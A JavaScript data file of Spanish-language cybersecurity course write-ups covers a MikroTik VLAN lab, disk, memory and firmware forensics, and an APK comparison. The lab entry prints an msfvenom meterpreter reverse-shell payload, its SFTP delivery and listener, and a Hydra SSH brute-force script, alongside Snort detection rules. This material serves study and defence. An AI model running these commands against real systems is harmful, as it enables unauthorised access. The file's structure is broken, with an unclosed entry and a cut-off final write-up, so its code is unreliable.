/* ===== AÑADE TUS INFORMES AQUÍ =====
   id: solo letras, números y guiones. date: opcional. content: Markdown sencillo.
   Imágenes: una línea sola con ![texto](img/archivo.png) */
var WRITEUPS = [
{
 id:"laboratorio-enrutado-vlan", date:"2026-05-25", category:"Laboratorios",
 title:"Segmentación de red con VLAN y enrutado entre MikroTik, con prácticas de ataque y detección",
 summary:"Red enrutada y segmentada con dos MikroTik, un switch D-Link, un servidor Fedora, Kali y una Raspberry Pi; incluye explotación, pivoting, mapeo de puertos y detección con Snort.",
 tags:["MikroTik","VLAN 802.1Q","Firewall","Metasploit","Nmap","Hydra","Snort"],
 content:[
"## Objetivo",
"Montar desde cero una red segmentada en VLAN, con enrutamiento entre varios equipos MikroTik y un servidor Linux como puerta de enlace, y usarla para practicar tanto ataque (explotación, pivoting, escaneo) como defensa (firewall, IDS). Laboratorio realizado en el curso de especialización en Ciberseguridad en entornos de las tecnologías de operación (OT), módulo Sistemas de Control Industrial Seguros, mayo de 2026.",
"## Equipos y topología",
"- **Servidor Fedora 36:** puerta de enlace a internet y servidor DHCP. Dos interfaces: una externa con IP por DHCP (zona firewalld `external`, con enmascaramiento/NAT activado) y una interna en 192.168.12.1/24 (zona `internal`, objetivo ACCEPT), hacia el router 1.",
"- **Router 1 (MikroTik):** conecta con el Fedora por `ether1` y agrupa el resto de interfaces (ether2-4 y wlan1) en un bridge propio, con su DHCP y acceso WiFi.",
"- **Router 2 (MikroTik):** cuelga del router 1 y es el que reparte la red en VLAN 31 y 32, con su propio firewall.",
"- **Switch D-Link:** reparte las VLAN por puerto mediante 802.1Q.",
"- **Kali Linux** (192.168.31.40): equipo atacante.",
"- **Raspberry Pi** (192.168.31.39): equipo objetivo, con SSH y VNC.",
"La cadena de enrutado queda: Fedora (12.1) → router 1 (12.2, bridge propio en 192.168.112.1) → router 2 (WAN en 192.168.112.2, LAN en 10.0.2.1 y VLAN 31/32) → switch → Kali / Raspberry.",
"## Configuración del servidor Fedora",
"- Interfaz externa: DHCP automático, con enmascaramiento activado en la zona `external` de firewalld (para compartir la salida a internet).",
"- Interfaz interna (hacia el router 1): IP manual 192.168.12.1/24, zona `internal` con objetivo `ACCEPT`.",
"- Servidor DHCP (`/etc/dhcp/dhcpd.conf`) para la red interna:",
"```",
"subnet 192.168.12.0 netmask 255.255.255.0 {",
"  option routers 192.168.12.1;",
"  option subnet-mask 255.255.255.0;",
"  option domain-name \"g2.fe36.local\";",
"  option domain-name-servers 8.8.8.8, 8.8.4.4;",
"  range 192.168.12.20 192.168.12.40;",
"}",
"```",
"## Configuración del router 1",
"- `ether1` apunta al Fedora: se le dio inicialmente una IP fija (192.168.12.2/24) y más adelante se pasó a cliente DHCP, con DNS 8.8.8.8 y ruta por defecto hacia 192.168.12.1 a través de `ether1`.",
"- Se creó un bridge (`bridge112`) agrupando el resto de interfaces (ether2, ether3, ether4 y wlan1), con IP propia 192.168.112.1/24.",
"- Pool DHCP para ese bridge: 192.168.112.20-192.168.112.40, servido por un DHCP server enlazado a `bridge112`.",
"- Se configuró también la red inalámbrica para poder acceder por WiFi además de por cable.",
"## Configuración del router 2",
"- Dos bridges: `bridgeWAN` (sube hacia el router 1, puerto raíz del spanning tree) y `bridgeLAN` (hacia el switch y los equipos).",
"- `bridgeWAN`: IP estática 192.168.112.2/24 (en la red del `bridge112` del router 1), con ruta por defecto hacia 192.168.112.1 comprobada por ping (check-gateway).",
"- `bridgeLAN`: IP 10.0.2.1/24.",
"- Interfaces VLAN sobre `bridgeLAN`: `vlan31` (ID 31, 192.168.31.1/24) y `vlan32` (ID 32, 192.168.32.1/24).",
"- Tres listas de interfaces para ordenar las reglas de firewall: `lans` (bridgeLAN), `vlans` (vlan31 y vlan32) y `wans` (bridgeWAN).",
"- Tres servidores DHCP, uno por red (bridgeLAN, vlan31, vlan32), cada uno con su propio pool y 10 minutos de lease.",
"- NAT: regla en la cadena `srcnat` con salida por `bridgeWAN` y acción `masquerade`, para dar salida a internet a toda la red.",
"- Firewall (filter rules), en este orden:",
"  1. Regla automática de fasttrack para conexiones `established` y `related`.",
"  2. Accept entre `lans` y `wans` en ambos sentidos (LAN con salida a internet).",
"  3. Accept entre `wans` y `vlans` en ambos sentidos (las VLAN también salen a internet).",
"  4. Drop final en `forward` para todo el tráfico que entra desde `vlans` que no haya hecho match antes (bloquea VLAN↔VLAN y VLAN↔LAN).",
"  5. Drop final en `input` para el tráfico desde `vlans` hacia el propio router (las VLAN no pueden administrar el router).",
"  Resultado: las VLAN 31 y 32 salen a internet pero no se ven entre sí ni con la LAN ni con la gestión del router.",
"## Configuración del switch",
"- Conectado al router 2 por el puerto 8. Para el primer acceso se puso IP fija en el equipo de gestión (conectado al puerto 7); después el switch pasó a DHCP y se volvió a entrar por la IP que le asignó el MikroTik.",
"- VLAN 802.1Q con Asymmetric VLAN activado. Configuración final por puerto:",
"```",
"VID 1  (default) -> untagged: eth7, eth8        tagged: eth1-eth6",
"VID 31            -> untagged: eth1, eth2, eth3  tagged: eth7, eth8",
"VID 32            -> untagged: eth4, eth5, eth6  tagged: eth7, eth8",
"PVID: eth1-3=31 · eth4-6=32 · eth7-8=1",
"```",
"- En la práctica: los puertos 1 a 3 son de acceso para la VLAN 31, los puertos 4 a 6 de acceso para la VLAN 32, y los puertos 7 y 8 actúan como enlace troncal (tagged) hacia el router 2.",
"## Configuración de los dispositivos finales",
"- **Kali Linux:** instalación por cable (sin usar WiFi), seguida de `apt update && apt upgrade` y la instalación de un servidor VNC para acceso remoto.",
"- **Raspberry Pi:** sistema grabado con Raspberry Pi Imager (Raspberry Pi 4), con personalización de hostname, usuario y autenticación SSH por contraseña habilitada desde el propio asistente. La IP asignada por DHCP (192.168.31.39) se localizó en los leases de Winbox y se comprobó el acceso por SSH. El VNC se activó después con `sudo raspi-config` → *System Options* → *VNC* → *Enable*, y se conectó con RealVNC Viewer.",
"## Prácticas",
"### 1. Exploits con Metasploit",
"```",
"systemctl start postgresql.service",
"msfconsole",
"nmap -sV -p21 192.168.31.39",
"```",
"El escaneo identificó **vsftpd 3.0.5**. Al ser una versión ya actualizada no se pudo explotar la vulnerabilidad que se esperaba, pero sí se localizó un aviso de seguridad sobre esa versión (CVE-2025-14242, denegación de servicio por desbordamiento al parsear el comando STAT).",
"### 2. Vector de infección",
"```",
"msfvenom -p python/meterpreter/reverse_tcp LHOST=192.168.31.40 LPORT=4000 -f raw > vector.py",
"sftp admin@192.168.31.39",
"sftp> put vector.py",
"```",
"Con la carga generada en Kali, se subió a la Raspberry por SFTP. En Metasploit se configuró `exploit/multi/handler` con el payload `python/meterpreter/reverse_tcp`, LHOST y LPORT igual que en la carga. El primer intento falló al enlazar el puerto; al corregirlo quedó el listener activo (`Started reverse TCP handler on 0.0.0.0:4000`). Al ejecutar `vector.py` en la Raspberry se abrió sesión de **meterpreter** sobre el objetivo, de forma silenciosa para el usuario del equipo.",
"### 3. Mapeo de puertos con Nmap",
"Batería de escaneos desde Kali, con resultados reales de la red del laboratorio:",
"```",
"nmap 192.168.31.39              # objetivo directo: 22/ssh, 5900/vnc",
"nmap 192.168.31.1 192.168.31.39 192.168.31.40   # multiobjetivo (router, raspberry, el propio kali)",
"nmap 192.168.31.1/24            # escaneo de subred: 256 direcciones, 3 equipos activos",
"nmap 192.168.31.20-40           # escaneo de rango",
"nmap -sV 192.168.31.39          # versiones: OpenSSH 8.0, VNC protocolo 3.8",
"nmap -sA 192.168.31.39          # comprobación de firewall: todos los puertos sin filtrar",
"nmap -sP 192.168.31.*           # descubrimiento de equipos activos",
"nmap -F 192.168.31.39           # escaneo rápido",
"```",
"Un escaneo adicional a 192.168.12.1 (el Fedora, en la otra punta de la cadena de enrutado) mostró que el tráfico llegaba correctamente a través de los dos routers, confirmando que el enrutamiento entre redes funcionaba de extremo a extremo.",
"### 4. Detección y prevención con Snort",
"Se prepararon tres scripts en Kali, usando `crunch` para generar diccionarios sencillos y `hydra` para el ataque de prueba:",
"```",
"# crear_usuarios",
"crunch 2 2 -t @@ -o usuarios.txt",
"",
"# crear_claves",
"crunch 2 2 -t @% -o claves.txt",
"",
"# lanzar_hydra (con la IP cambiada por la de la Raspberry antes de ejecutarlo)",
"hydra -L usuarios.txt -P claves.txt -o resultados.txt -t 4 -I ssh://192.168.31.39:22",
"```",
"Antes de atacar se comprobó el objetivo con `ping` y `nmap`. En la Raspberry se instaló Snort (`apt install snort`), indicando como red local 192.168.31.0/24, y se añadió un fichero de reglas propio:",
"```",
"# /etc/snort/rules/custom.rules",
"alert icmp any any -> $HOME_NET any (msg:\"Tráfico ICMP!!\"; sid:30000001;)",
"alert tcp $EXTERNAL_NET any -> $HOME_NET 22 (msg:\"Entrando SSH\"; flags:S; sid:30000002;)",
"```",
"Se incluyó `custom.rules` en `/etc/snort/snort.conf` y se reinició el servicio (`systemctl restart snort`). El objetivo de lanzar Hydra no era comprometer la cuenta, sino generar tráfico SSH de prueba para comprobar la detección: en el log de Snort (`/var/log/snort`) aparecieron tanto los pings como cada intento de conexión SSH, clasificados como *Detection of a Network Scan*.",
"## Resultados",
"- Red funcional segmentada en VLAN, con DHCP por segmento, acceso remoto por SSH y VNC, y enrutamiento verificado de extremo a extremo (Fedora → router 1 → router 2 → switch → equipos).",
"- Las VLAN 31 y 32 quedaron aisladas entre sí y respecto a la LAN y a la gestión del router, pero con salida a internet, como se buscaba.",
"- vsftpd 3.0.5, por estar actualizado, no fue explotable con el exploit esperado; sí expuesto a un DoS conocido de esa versión.",
"- Sesión de meterpreter obtenida sobre la Raspberry mediante una carga ejecutada en el propio objetivo.",
"- Snort, con dos reglas propias, detectó correctamente el tráfico ICMP y los intentos de conexión SSH generados durante la prueba con Hydra.",
"## Lecciones aprendidas",
"- Mantener los servicios actualizados reduce de forma real la superficie de ataque: fue el motivo concreto por el que no se pudo explotar vsftpd.",
"- Separar la red en VLAN y ordenar las reglas de firewall por listas de interfaces hace el diseño mucho más legible y fácil de auditar que tener reglas sueltas por IP.",
"- El orden de las reglas de firewall importa tanto como su contenido: el aislamiento entre VLAN no vino de una regla explícita de bloqueo VLAN↔VLAN, sino de dejar sin cubrir ese tráfico antes del drop final.",
"- Un IDS como Snort solo detecta lo que se le indica en sus reglas: sin la regla personalizada para el puerto 22, los intentos de SSH habrían pasado desapercibidos.",
"## Nota ética",
"Todas las pruebas se realizaron sobre equipos propios, en una red de laboratorio aislada y con fines formativos."
].join("\n")
},

{
 id:"forense-disco-autopsy", category:"Análisis forense",
 title:"Análisis forense de disco con Autopsy: descarga maliciosa, ejecución y persistencia",
 summary:"Análisis de una imagen de disco de Windows con Autopsy: un falso instalador de WinRAR, ejecutables con nombre aleatorio en Temp y Startup, y tráfico de red anómalo recuperado de SRUM.",
 tags:["Autopsy", "Disco", "Zone.Identifier", "SRUM", "BAM", "LNK"],
 content:[
"## Objetivo",
"Analizar con Autopsy la imagen de disco de un equipo Windows (`Practica5a.img`) y reconstruir qué pasó: qué se descargó, qué se ejecutó, cómo se aseguró la persistencia y qué actividad de red dejó. La imagen pertenece a otra máquina distinta de la del analista: se descarga comprimida en un `.zip` y se vuelca en Autopsy, por lo que todas las fechas y horas corresponden al equipo analizado y no tienen por qué coincidir con las del equipo de trabajo. Práctica realizada en el curso de especialización en Ciberseguridad en entornos de las tecnologías de operación (OT).",
"## Preparación del caso en Autopsy",
"- **Caso nuevo (New Case):** nombre y carpeta del caso. En el paso opcional se pueden indicar número de caso, datos del examinador (nombre, teléfono, correo, notas) y organización; en esta práctica se dejaron sin rellenar (`Not Specified`).",
"- **Fuente de datos (Add Data Source):** imagen de disco `Practica5a.img`.",
"- **Módulos de ingesta**, ejecutados sobre `All Files, Directories, and Unallocated Space`: Recent Activity, Hash Lookup, File Type Identification, Extension Mismatch Detector, Embedded File Extractor, Picture Analyzer, Keyword Search, Email Parser, Encryption Detection, Interesting Files Identifier, Central Repository, PhotoRec Carver y Virtual Machine Extractor.",
"- **Keyword Search:** listas activadas de direcciones de correo, URLs y números de tarjeta de crédito, con codificaciones UTF8 y UTF16, texto añadido al índice Solr y OCR desactivado.",
"## Análisis",
"### 1. Descarga sospechosa (Web Downloads)",
"En el apartado `Web Downloads` de Autopsy aparecen 3 resultados:",
"```",
"C:\\Users\\Stude\\Downloads\\WinrarInstalller.zip",
"/Users/Stude/AppData/Local/Temp/Temp1_WinrarInstalller.zip/9dbb93d14e7d880f.exe:Zone.Identifier",
"/Users/Stude/AppData/Roaming/Microsoft/Windows/Start Menu/Programs/Startup/482887cdfb93fbc01176d9593d0ebb63.exe:Zone.Identifier",
"```",
"- El archivo se llama `WinrarInstalller.zip`, con **tres «l»** en «Installler»: una errata típica de archivos maliciosos que imitan a un instalador legítimo de WinRAR.",
"- `Zone.Identifier` es un flujo de datos alternativo (ADS) que Windows añade a lo que procede de internet. Que los dos ejecutables lo tengan confirma que salieron de ese zip descargado.",
"Así se ve en Autopsy: la descarga en `Downloads`, el ejecutable extraído a `Temp` y el de `Startup`, los dos con su `Zone.Identifier`.",
"![Autopsy, Web Downloads: el zip descargado y los dos ejecutables con Zone.Identifier en Temp y Startup](img/autopsy-web-downloads.png)",
"### 2. Ejecución",
"- El prefijo `Temp1_` de la ruta es el que crea el Explorador de Windows al abrir un `.zip` y lanzar su contenido: el usuario abrió el zip y ejecutó desde dentro `9dbb93d14e7d880f.exe`, en `AppData\\Local\\Temp`.",
"- Un nombre aleatorio de números y letras es una señal clásica de malware o troyano.",
"En `Recent Documents` se ven los accesos directos (LNK) que dejó el usuario:",
"```",
"Programas y características.lnk   2022-06-17 10:43:43 CEST",
"Internet.lnk                      2022-06-17 10:45:43 CEST",
"windowsdefender---.lnk            2022-06-17 10:45:43 CEST",
"WinrarInstalller.lnk  ->  C:\\Users\\Stude\\Downloads\\WinrarInstalller.zip   2022-06-17 11:20:05 CEST",
"WinrarInstalller.zip.lnk  (mismo destino, sin fecha)",
"Music / Videos / Desktop / Pictures / Downloads / Documents .lnk (carpetas de usuario, sin fecha)",
"```",
"La tabla `Recent Documents` tal y como la muestra Autopsy, con la fecha de acceso de cada LNK:",
"![Autopsy, Recent Documents: accesos directos con su fecha de acceso, incluido el del zip descargado](img/autopsy-recent-documents.png)",
"Los accesos a «Programas y características» y a Windows Defender, junto con el acceso al zip, indican que el usuario estuvo revisando programas y seguridad del sistema en la misma franja horaria en la que se manipuló el archivo descargado.",
"### 3. Persistencia",
"Hay un segundo ejecutable con nombre aleatorio en la carpeta `Startup` del menú Inicio del usuario (`.../Start Menu/Programs/Startup/482887cdfb93fbc01176d9593d0ebb63.exe`). Todo lo que hay en esa carpeta se ejecuta al iniciar sesión, así que el presunto malware se configuró para arrancar cada vez que se enciende el PC.",
"### 4. Actividad de red (SRUDB.dat)",
"La base de datos SRUM (`SRUDB.dat`) registra el uso de recursos y de red por proceso. La línea relevante exportada de Autopsy es:",
"```",
"SRUDB.dat,\"\\program files (x86)\\microsoft\\edgeupdate\\microsoftedgeupdate.exe\",,\"2022-06-17 09:25:00 CEST\",\"System Resource Usage - Network Usage\",Practica5a.img,562766,130050246",
"```",
"- `microsoftedgeupdate.exe` aparece con **130.050.246 bytes recibidos**, una cantidad elevada para una actualización en segundo plano. Se anota como indicio de consumo anómalo que habría que correlacionar con más evidencias.",
"- `smartscreen.exe` también muestra bastante actividad. Es el componente que Windows usa para comprobar si un archivo descargado es seguro, así que es probable que el sistema avisara cuando se descargó el falso instalador.",
"### 5. Programas ejecutados (BAM)",
"El Background Activity Moderator registra qué ejecutó cada cuenta y cuándo:",
"```",
"SYSTEM,\"\\Windows\\explorer.exe\",,\"2022-06-17 10:50:37 CEST\",\"Recently Executed according to Background Activity Moderator (BAM)\",Practica5a.img,,",
"SYSTEM,\"\\Windows\\System32\\Taskmgr.exe\",,\"2022-06-17 10:47:35 CEST\",\"Recently Executed according to Background Activity Moderator (BAM)\",Practica5a.img,,",
"```",
"Ejecutar el Administrador de tareas a las 10:47 es compatible con un usuario intentando ver qué pasaba en el equipo.",
"## Resumen de hallazgos",
"- **Descarga sospechosa** (`Web Downloads`): `WinrarInstalller.zip`, con la triple «l» en el nombre.",
"- **Ejecución de malware** (`Recent Documents` y `Web Downloads`): `9dbb93d14e7d880f.exe` en `AppData\\Local\\Temp`, con nombre aleatorio.",
"- **Persistencia** (`Web Downloads`): ejecutable con nombre aleatorio copiado a la carpeta `Startup`, para ejecutarse siempre.",
"- **Consumo de datos** (`Run Programs`): `microsoftedgeupdate.exe` con 130.050.246 bytes recibidos.",
"## Conclusiones",
"- El equipo muestra la cadena típica de infección: descarga de un instalador falso, ejecución desde el zip (Temp), copia a `Startup` para persistir y tráfico de red anómalo.",
"- Un análisis sin ejecutar nada en el equipo permite reconstruir toda la cadena solo con artefactos del sistema: Web Downloads, LNK, SRUM y BAM.",
"- Como siguientes pasos convendría calcular el hash de los dos ejecutables y analizarlos en un entorno aislado, aislar el equipo y eliminar la persistencia de `Startup`."
].join("\n")
},

{
 id:"forense-memoria-ram-volatility", category:"Análisis forense",
 title:"Análisis forense de memoria RAM con Volatility 3: detección de un falso svchost",
 summary:"Análisis de un volcado de memoria de Windows 10 con Volatility 3 para localizar un proceso que suplanta a svchost.exe y justificar por qué es malicioso.",
 tags:["Volatility 3", "Memoria RAM", "pstree", "malfind", "filescan", "Masquerading"],
 content:[
"## Objetivo",
"Analizar un volcado de memoria RAM de un equipo Windows (`practica4c.raw`) con Volatility 3 para detectar un proceso malicioso y justificar por qué lo es. Práctica realizada en el curso de especialización en Ciberseguridad en entornos de las tecnologías de operación (OT).",
"## Herramienta y entorno",
"Volatility 3 Framework 2.28.0, ejecutado desde su carpeta (`~/Desktop/examen/volatility3`) con Python 3. Todas las consultas siguen el mismo patrón:",
"```",
"python3 vol.py -f /home/sorry/Desktop/examen/practica4c.raw <plugin>",
"```",
"## 1. Escaneo inicial",
"```",
"python3 vol.py -f /home/sorry/Desktop/examen/practica4c.raw windows.info",
"```",
"Datos relevantes de la salida:",
"```",
"Kernel Base      0xf8053cc00000",
"DTB              0x1aa000",
"Is64Bit          True",
"IsPAE            False",
"layer_name       0 WindowsIntel32e",
"memory_layer     1 FileLayer",
"KdVersionBlock   0xf8053d80f368",
"Major/Minor      15.19041",
"MachineType      34404",
"KeNumberProcessors  1",
"SystemTime       2022-06-14 09:31:17+00:00",
"NtSystemRoot     C:\\Windows",
"NtProductType    NtProductWinNt",
"NtMajorVersion   10",
"NtMinorVersion   0",
"```",
"Se trata de un Windows 10 de 64 bits (build 19041) con un único procesador, y el volcado se capturó el 2022-06-14 a las 09:31:17 UTC. Volatility resolvió los símbolos del kernel (`ntkrnlmp.pdb`) sin problemas, así que el resto de plugins funcionan.",
"Salida completa del plugin en la terminal:",
"![Volatility 3: salida completa de windows.info sobre practica4c.raw](img/volatility-windows-info.png)",
"## 2. Procesos: encontrado el sospechoso svchost.com (PID 5480)",
"```",
"python3 vol.py -f /home/sorry/Desktop/examen/practica4c.raw windows.pstree",
"```",
"El árbol de procesos permite ver quién lanzó a quién. Aparece un proceso `svchost.com` con PID 5480 que no encaja con los `svchost.exe` legítimos:",
"- **Nombre engañoso:** el proceso legítimo de Windows es `svchost.exe`. El malware usa la extensión `.com` para confundir al usuario o aprovechar el orden de ejecución de Windows.",
"- **Ruta de ejecución:** los `svchost.exe` reales se ejecutan siempre desde `C:\\Windows\\System32`. Este lo hace desde `\\Device\\HarddiskVolume2\\Users\\Stude\\Documents\\svchost.com\\svchost.com`.",
"- **Proceso padre (PPID):** su padre es el PID 2880, que es `explorer.exe`. Un `svchost.exe` legítimo cuelga de `services.exe`; que cuelgue de `explorer.exe` significa que el usuario hizo doble clic en ese archivo en su carpeta de documentos.",
"- **Arquitectura (Wow64):** es un proceso de 32 bits ejecutándose en un sistema de 64 bits, algo muy común en malware antiguo o empaquetado.",
"## 3. Verificación con más plugins",
"Se comprobó el PID 5480 con red, inyección de código y ficheros:",
"```",
"python3 vol.py -f /home/sorry/Desktop/examen/practica4c.raw windows.netscan | grep 5480",
"python3 vol.py -f /home/sorry/Desktop/examen/practica4c.raw windows.malfind --pid 5480",
"python3 vol.py -f /home/sorry/Desktop/examen/practica4c.raw windows.filescan | grep \"svchost.com\"",
"```",
"- `windows.netscan | grep 5480`: sin resultados, es decir, el proceso no tenía conexiones de red registradas en el momento de la captura.",
"- `windows.malfind --pid 5480`: solo devuelve la cabecera de la tabla (`PID, Process, Start VPN, End VPN, Tag, Protection, CommitCharge, PrivateMemory, File output, Notes, Hexdump, Disasm`), sin regiones sospechosas. Además, la versión usada avisa de que `windows.malfind` ha sido renombrado a `windows.malware.malfind.Malfind` y se eliminará tras 2026-06-07.",
"- `windows.filescan | grep \"svchost.com\"`: el fichero aparece en memoria cuatro veces:",
"```",
"0x8008f76946d0  \\Users\\Stude\\Documents\\svchost.com\\svchost.com",
"0x8008f76ad6d0  \\Users\\Stude\\Documents\\svchost.com",
"0x8008f76b24f0  \\Users\\Stude\\Documents\\svchost.com",
"0x8008f76b7950  \\Users\\Stude\\Documents\\svchost.com",
"```",
"El resultado en la terminal, con `svchost.com` resaltado en las cuatro rutas:",
"![Volatility 3: windows.filescan filtrado por svchost.com, con las cuatro rutas dentro de Documents](img/volatility-filescan-svchost.png)",
"Destaca que `svchost.com` es a la vez una carpeta dentro de Documentos y el ejecutable que contiene, un detalle más del intento de pasar desapercibido.",
"## Proceso sospechoso detectado",
"- **Nombre del proceso:** `svchost.com`",
"- **PID:** 5480",
"- **Ruta en disco:** `C:\\Users\\Stude\\Documents\\svchost.com\\svchost.com`",
"- **Proceso padre:** `explorer.exe` (PID 2880)",
"## Justificación de la maliciosidad",
"- **Suplantación de identidad (masquerading):** usa el nombre `svchost`, que pertenece a un servicio crítico de Windows, pero cambia la extensión legítima `.exe` por `.com`.",
"- **Ruta anómala:** un proceso de sistema nunca debe ejecutarse desde la carpeta de documentos de un usuario (`\\Users\\Stude\\Documents\\`). Su ubicación legítima es únicamente `C:\\Windows\\System32`.",
"- **Ejecución interactiva:** al ser hijo de `explorer.exe`, no se inició como un servicio automático del sistema, sino por una acción directa del usuario (doble clic).",
"## Conclusiones",
"- Comparar nombre, ruta y proceso padre con lo que es normal en Windows basta para detectar un proceso que se hace pasar por un servicio del sistema.",
"- Que `netscan` y `malfind` no devuelvan resultados no lo hace inocente: la maliciosidad se demuestra por la suplantación, la ruta y la forma de ejecución.",
"- Como siguiente paso se podría extraer el ejecutable de memoria (`windows.dumpfiles`) para calcular su hash y analizarlo en un entorno aislado."
].join("\n")
},

{
 id:"mobsf-whatsapp-apkmirror-vs-play-store", category:"Análisis de aplicaciones",
 title:"Análisis estático de WhatsApp con MobSF: APKMirror frente a Google Play",
 summary:"Comparación con MobSF de una APK de WhatsApp descargada de APKMirror y la de Google Play: firma, componentes, permisos, hallazgos y conexiones, para decidir si la de terceros está manipulada.",
 tags:["MobSF", "Android", "APK", "Análisis estático", "Firma digital"],
 content:[
"## Objetivo",
"Determinar si la APK de WhatsApp descargada de una fuente de terceros (APKMirror) presenta modificaciones, permisos adicionales, diferencias en la firma digital o cualquier otro indicador de manipulación respecto a la de la fuente oficial (Google Play Store). Práctica realizada en el curso de especialización en Ciberseguridad en entornos de las tecnologías de operación (OT).",
"## Herramienta y método",
"Mobile Security Framework (MobSF) v4.4.11, una herramienta de análisis estático de aplicaciones móviles. Se subieron las dos APK a MobSF y se compararon, en este orden: firma digital, componentes, permisos, hallazgos de seguridad y URLs y dominios.",
"## Muestras analizadas",
"```",
"                      APKMirror (base.apk)    Play Store",
"Fichero               base.apk                whatsapp-messenger-2-26-17-73.apk",
"Versión               2.26.17.72              2.26.17.73",
"Tamaño                106.62 MB               135.06 MB",
"MD5                   82f75b05913db10b...     81302dde29bf781f...",
"SHA1                  764338cd7a8d4b8f...     4d0b67233e3f59f2...",
"SHA256                da81f4bd001cb9e1...     9c1100d400ff945e...",
"Puntuación            51/100 (MEDIUM RISK)    51/100 (MEDIUM RISK)",
"SDK mínimo / objetivo 21 (Android 5.0) / 36   21 (Android 5.0) / 36",
"```",
"La de APKMirror es el `base.apk` extraído de un bundle `.apkm`. Es una versión anterior en una unidad (72 frente a 73), por lo que los hashes del archivo no pueden coincidir: lo que hay que comparar es la firma.",
"## 1. Firma digital",
"La firma es el elemento más importante para verificar la autenticidad de una APK: si difiere, la aplicación fue modificada o recompilada por un tercero.",
"```",
"                      APKMirror               Play Store",
"Firmado               Sí                      Sí",
"Esquemas v1 / v2      True / True             True / True",
"Esquemas v3 / v4      False / False           False / False",
"Algoritmo de firma    DSA                     DSA",
"Algoritmo de hash     SHA-1                   SHA-1",
"Sujeto X.509          CN=Brian Acton, O=WhatsApp Inc.   (igual)",
"Válido                2010-06-25 a 2044-02-15           (igual)",
"SHA256 del certificado 3987d043d10aefaf...    3987d043d10aefaf...",
"Nº de certificados    1                       1",
"```",
"**Resultado:** ambas APK están firmadas con exactamente el mismo certificado de WhatsApp Inc. (todos los hashes del certificado coinciden), por lo que ninguna ha sido recompilada ni modificada por un tercero.",
"## 2. Componentes",
"```",
"Activities 736 · Services 58 · Receivers 59 · Providers 16",
"Exportados: 47 activities · 15 services · 15 receivers · 7 providers",
"```",
"Los valores son idénticos en ambas APK. No hay actividades, servicios ni receptores añadidos que sugieran funcionalidad maliciosa.",
"## 3. Permisos",
"- 23 permisos peligrosos y 23 normales en las dos APK.",
"- Permisos sensibles idénticos en ambas: ubicación (`coarse` y `fine`), SMS (`RECEIVE_SMS`, `SEND_SMS`), contactos (`READ_CONTACTS`, `WRITE_CONTACTS`), micrófono (`RECORD_AUDIO`), cámara (`CAMERA`), almacenamiento externo y `READ_PHONE_STATE`.",
"- **Resultado:** la APK de APKMirror no pide permisos adicionales ni sospechosos.",
"## 4. Hallazgos de seguridad de MobSF",
"```",
"Severidad   APKMirror   Play Store",
"Alta            7           7",
"Media         103         103",
"Info            2           2",
"Secure          7           7",
"Hotspot         2           2",
"```",
"Los hallazgos de severidad alta son los mismos en ambas y corresponden a la configuración propia de WhatsApp, no a modificaciones:",
"- Tráfico en texto claro permitido a todos los dominios en la configuración base de red.",
"- Configuración de red que confía en certificados de usuario instalados.",
"- Certificate pinning que puede evadirse en la configuración base.",
"- Aplicación instalable en versiones antiguas de Android con vulnerabilidades sin parchear.",
"- Prioridades de intent que pueden sobrescribir otras solicitudes del sistema.",
"- Problemas de validación de certificados (CWE-295).",
"## 5. URLs y conexiones remotas",
"Todos los dominios detectados pertenecen a WhatsApp/Meta: `b.whatsapp.com` y `v.whatsapp.com` (backend), `call.whatsapp.com` (llamadas VoIP), `chat.whatsapp.com` (mensajería), `event.whatsapp.com` (telemetría de eventos), `www.whatsapp.com` (web oficial) y los esquemas internos `whatsapp://` y `whatsapp-smb://`. No hay conexiones a servidores externos ni a dominios de terceros.",
"## 6. Diferencias detectadas",
"- **Versión** (72 frente a 73): relevancia baja, la de APKMirror es ligeramente anterior.",
"- **Tamaño** (106.62 MB frente a 135.06 MB): se explica por el formato `.apkm`; `base.apk` no incluye los APK de configuración para arquitectura, idioma y densidad de pantalla. Es normal y esperado.",
"- **Hashes del archivo:** distintos, como corresponde a versiones diferentes.",
"- **Hashes del certificado, componentes, permisos y hallazgos:** idénticos.",
"## Conclusiones",
"```",
"Criterio                   Resultado                               Veredicto",
"Firma digital              Certificado idéntico en ambas           Legítima",
"Permisos                   Sin permisos adicionales                Legítima",
"Componentes                Estructura idéntica                     Legítima",
"Conexiones remotas         Solo servidores de WhatsApp/Meta        Legítima",
"Código inyectado           Sin hallazgos adicionales               Legítima",
"Puntuación de seguridad    51/100 en ambas                         Idéntico",
"```",
"**Veredicto final:** la APK de WhatsApp de APKMirror es una copia legítima y no modificada de la aplicación oficial: no presenta indicadores de manipulación, código malicioso, permisos adicionales ni conexiones sospechosas.",
"- Es un análisis estático: demuestra que no hay diferencias en firma, estructura y permisos, pero no observa el comportamiento en ejecución, que requeriría análisis dinámico.",

{
 id:"forense-firmware-camara-iot", category:"IoT",
 title:"Análisis forense estático del firmware de una cámara IoT",
 summary:"Análisis sin ejecutar de la imagen de firmware de una cámara IoT con file y binwalk: sistema operativo, sistemas de ficheros, servicios, usuarios y riesgos como la cuenta root sin contraseña.",
 tags:["Firmware", "binwalk", "SquashFS", "JFFS2", "Linux embebido", "IoT"],
 content:[
"## Objetivo",
"Extraer evidencias digitales del firmware de una cámara IoT (`tf_recovery.img`) para identificar su sistema operativo, sus sistemas de ficheros, los usuarios y los servicios que ejecuta, y evaluar su seguridad. El análisis es **estático (off-device)**: se trabaja solo con el archivo de imagen, sin encender el dispositivo. Práctica realizada en el curso de especialización en Ciberseguridad en entornos de las tecnologías de operación (OT).",
"## Por qué un análisis estático",
"- No requiere ejecutar el firmware ni disponer del hardware.",
"- No altera el estado del dispositivo (principio de no alteración de la evidencia).",
"- Es reproducible: las mismas herramientas sobre el mismo archivo dan los mismos resultados.",
"- Se contrapone al análisis dinámico, que ejecutaría el firmware en el hardware real o en un emulador (por ejemplo QEMU para ARM).",
"## 1. Identificación del archivo",
"`file` inspecciona los primeros bytes en lugar de fiarse de la extensión:",
"```",
"$ file tf_recovery.img",
"tf_recovery.img: u-boot legacy uImage, Linux-3.3.0, Linux/ARM,",
"OS Kernel Image (Not compressed), 1911456 bytes,",
"Wed Dec 12 10:18:18 2018,",
"Load Address: 0X008000, Entry Point: 0X008000,",
"Header CRC: 0X4A67D2CC, Data CRC: 0X9A892BBD",
"```",
"Es una imagen `uImage` (formato de U-Boot) con un kernel Linux 3.3.0 para ARM, creada el 12 de diciembre de 2018.",
"## 2. Estructura interna con binwalk",
"```",
"$ binwalk tf_recovery.img",
"DECIMAL      HEXADECIMAL   DESCRIPTION",
"0            0x0           uImage header (64 bytes)",
